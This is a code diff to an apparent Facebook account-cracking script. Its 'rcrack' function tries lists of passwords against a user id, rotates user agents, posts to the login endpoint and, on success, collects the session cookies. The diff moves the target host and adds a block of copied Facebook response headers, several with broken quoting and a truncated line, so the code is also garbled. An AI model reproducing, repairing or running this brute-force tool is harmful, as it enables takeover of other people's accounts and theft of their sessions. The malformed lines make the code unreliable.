@@ -288,7 +288,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://p.facebook.com').text
+            free_fb = session.get('https://developers.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -299,9 +299,19 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-            'method':'GET',
+            header_freefb = {'authority': 'developers.facebook.com',
+            'method':'page',
             'scheme':'https',
+            'authority: 'developer.facebook.com',
+			'x-fb-rlafr '0',
+			'access-control-allow-origin'*',
+			'facebook-api-version': 'v16.0',
+			'strict-transport-security': 'max-age=15552000",
+			'pragma: no-cache, 'cache-control': 'private, no-cache, no-store, must-rev
+			'x-fb-request-id': 'Al81XgCNxC9JRtUgxREw8Wq',
+			'x-fb-trace-id: 'C+ROs2fFnV0",
+			'x-fb-rev': '1007615493',
+			'x-fb-debug': '2gQCRVQbsarGBYxBL33VnztHQLULyjB+GoXvupCLtDrJrBvSvB1JYgDzhThuYqEmJcQfLpRrv+/DvtiPMYG4GA==
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
@@ -317,7 +327,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
-            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://developers.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
